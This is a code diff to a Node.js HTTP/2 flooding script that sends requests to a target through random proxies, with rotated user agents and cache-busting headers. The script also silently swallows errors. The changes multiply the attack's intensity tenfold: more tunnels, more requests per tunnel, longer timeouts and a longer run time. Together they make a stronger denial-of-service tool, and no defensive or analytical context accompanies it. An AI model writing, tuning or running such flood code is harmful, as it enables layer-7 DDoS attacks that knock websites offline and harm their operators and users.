@@ -56,14 +56,14 @@ class TlsBuilder {
     }
 
     http2TUNNEL(socket){
-        socket.setKeepAlive(true, 10000);
-        socket.setTimeout(10000);
+        socket.setKeepAlive(true, 100000);
+        socket.setTimeout(100000);
         payload[":method"] = "GET";
         payload["Referer"] = objetive;
         payload["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
         payload["Cache-Control"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
         payload["Pragma"] = 'no-cache, no-store,private, max-age=0, must-revalidate';
-        payload['client-control'] = 'max-age=43200, s-max-age=43200';
+        payload['client-control'] = 'max-age=432000, s-max-age=432000';
         payload['Upgrade-Insecure-Requests'] = 1;
         payload['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"; //'*/*';
         payload['Accept-Encoding'] = 'gzip, deflate, br';
@@ -86,7 +86,7 @@ class TlsBuilder {
                 ALPNProtocols: ['h2'],
             }, () => {
                 
-        for (let i = 0; i < 12; i++) {
+        for (let i = 0; i < 120; i++) {
 
             setInterval(async () => {
                 await tunnel.request(payload).close()
@@ -103,14 +103,14 @@ const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, m
 
 function Runner(){
 
-    for (let i = 0; i < 200; i++) {
+    for (let i = 0; i < 2000; i++) {
 var proxy = proxies[Math.floor(Math.random() * proxies.length)];
 proxy = proxy.split(':');
                     
 var req = http.get({ 
         host: proxy[0],
         port: proxy[1],
-        timeout: 100000,
+        timeout: 1000000,
         method: "CONNECT",
         agent: keepAliveAgent,
 
@@ -133,7 +133,7 @@ setInterval(Runner)
 
 setTimeout(function(){
     process.exit();
-}, process.argv[3] * 10000);
+}, process.argv[3] * 100000);
 
 process.on('uncaughtException', function(er) {
 });
